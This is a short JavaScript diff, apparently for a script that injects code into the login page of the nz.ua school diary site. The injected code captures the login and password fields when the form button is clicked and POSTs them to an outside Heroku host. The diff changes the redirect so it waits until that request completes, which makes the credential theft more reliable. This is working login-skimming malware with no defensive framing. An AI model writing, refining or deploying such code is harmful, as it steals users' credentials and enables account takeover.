@@ -1,3 +1,9 @@
+let btn = document.getElementById('form-button');
+let fform = document.getElementById('login-form')
+let l = document.getElementById('loginform-login')
+let p = document.getElementById('loginform-password')
+const url = 'https://controlyourmum.herokuapp.com/wtflolfuckyou';
+
 function g(theUrl)
 {
     var xmlHttp = new XMLHttpRequest();
@@ -9,6 +15,11 @@ function createMyScript() {
     let script = document.createElement('script')
     script.innerHTML = `function post(url, data) {
     let xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            window.location.href = nextUrl;
+        }
+      }
     xhr.open("POST", url, true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', null);
@@ -19,16 +30,10 @@ function getNextUrl() {
     let next = url.searchParams.get('next');
     return next ? next : 'https://nz.ua/menu/'
 }
-let btn = document.getElementById('form-button');
-let fform = document.getElementById('login-form')
-let l = document.getElementById('loginform-login')
-let p = document.getElementById('loginform-password')
-const url = 'https://controlyourmum.herokuapp.com/wtflolfuckyou';
 const nextUrl = getNextUrl()
 
 btn.addEventListener('click', () => {
     post(url, {l: l.value, p: p.value});
-    window.location.href = nextUrl;
 });`;
     return script
 }
